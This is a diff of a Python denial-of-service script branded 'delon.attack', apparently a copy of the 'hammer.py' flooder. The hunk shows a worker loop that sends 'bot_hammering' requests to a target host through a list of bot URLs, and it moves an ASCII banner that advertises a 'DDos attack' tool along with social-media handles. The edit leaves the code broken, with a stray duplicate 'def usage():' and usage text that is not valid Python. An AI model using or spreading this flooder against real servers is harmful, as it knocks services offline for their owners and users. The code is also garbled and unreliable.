@@ -70,22 +70,23 @@ def dos2():
 		item=w.get()
 		bot_hammering(random.choice(bots)+"http://"+host)
 		w.task_done()
-def logo():
-print("\033[91m oooooooooo.                     .       .                       oooo        
-print("\033[91m `888'   `Y8b                  .o8     .o8                       `888        
-print("\033[91m  888      888      .oooo.   .o888oo .o888oo  .oooo.    .ooooo.   888  oooo 
-print("\033[91m  888      888     `P  )88b    888     888   `P  )88b  d88' `"Y8  888 .8P'
-print("\033[91m  888      888      .oP"888    888     888    .oP"888  888        888888.
-print("\033[91m  888     d88' .o. d8(  888    888 .   888 . d8(  888  888   .o8  888 `88b.
-print("\033[91m  o888bood8P'   Y8P `Y888""8o   "888"   "888" `Y888""8o `Y8bod8P' o888o o888o
-print("\033[91m  <===><===><===><===><===><===><===>°•°<===><===><===><===><===><===><===><===>
-print("\033[91m  *.          Toolek Bo (DDos)attack    bar prs nem la Hala bakar henan.      .*
-print("\033[91m  *.      Instagram:@t4llun   &&   @kam.aql  t.me/del4m  Snapchat:delon_m20.  .*
-print("\033[91m  *.    Welcome to delon.attack tools <> baxer ben Bo toole delon.attack.     .*
-print("\033[91m  *.                 edit by : delon.     Ba hewae sud.                        *
-print("\033[91m  <===><===><===><===><===><===><===>°•°<===><===><===><===><===><===><===><===>
+
 def usage():
 	print (''' \033[92m
+ oooooooooo.                     .       .                       oooo        
+ `888'   `Y8b                  .o8     .o8                       `888        
+  888      888      .oooo.   .o888oo .o888oo  .oooo.    .ooooo.   888  oooo 
+  888      888     `P  )88b    888     888   `P  )88b  d88' `"Y8  888 .8P'
+  888      888      .oP"888    888     888    .oP"888  888        888888. 
+  888     d88' .o. d8(  888    888 .   888 . d8(  888  888   .o8  888 `88b.
+  o888bood8P'   Y8P `Y888""8o   "888"   "888" `Y888""8o `Y8bod8P' o888o o888o
+  <===><===><===><===><===><===><===>°•°<===><===><===><===><===><===><===><===>
+  *.          Toolek Bo (DDos)attack    bar prs nem la Hala bakar henan.      .*
+  *.      Instagram:@t4llun   &&   @kam.aql  t.me/del4m  Snapchat:delon_m20.  .*
+  *.    Welcome to delon.attack tools <> baxer ben Bo toole delon.attack.     .*
+  *.                 edit by : delon.     Ba hewae sud.                        *
+  <===><===><===><===><===><===><===>°•°<===><===><===><===><===><===><===><===>
+def usage():
 	delon.attack Dos Script v.1
 	usage : python3 hammer.py [-s] [-p] [-t]
 	-h : yarmati
